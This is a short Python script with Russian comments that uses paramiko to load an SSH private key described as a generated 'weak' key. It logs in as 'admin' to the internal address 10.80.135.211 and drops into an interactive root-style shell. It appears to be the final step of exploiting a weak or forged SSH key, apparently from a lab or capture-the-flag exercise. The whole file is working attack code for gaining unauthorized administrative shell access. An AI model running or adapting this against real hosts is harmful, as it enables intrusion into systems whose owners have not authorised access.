import paramiko
import sys
import threading

# НАСТРОЙКИ
KEY_FILE = "id_rsa_admin"  # Твой сгенерированный файл
HOST = "10.80.135.211"
USER = "admin"

def interactive_shell(chan):
    # Функция для создания интерактивной сессии
    import select
    import tty
    import termios
    
    oldtty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        tty.setcbreak(sys.stdin.fileno())
        chan.settimeout(0.0)
        
        while True:
            r, w, e = select.select([chan, sys.stdin], [], [])
            if chan in r:
                try:
                    x = chan.recv(1024)
                    if len(x) == 0:
                        break
                    sys.stdout.write(x.decode())
                    sys.stdout.flush()
                except:
                    break
            if sys.stdin in r:
                x = sys.stdin.read(1)
                if len(x) == 0:
                    break
                chan.send(x)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)

try:
    # Загружаем "слабый" ключ
    key = paramiko.RSAKey.from_private_key_file(KEY_FILE)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    print(f"[*] Connecting to {HOST} as {USER} with weak key...")
    client.connect(hostname=HOST, username=USER, pkey=key)
    print("[+] Success! Dropping into shell...\n")
    
    # Открываем шелл
    channel = client.invoke_shell()
    interactive_shell(channel)
    
    channel.close()
    client.close()

except Exception as e:
    print(f"[-] Error: {e}")
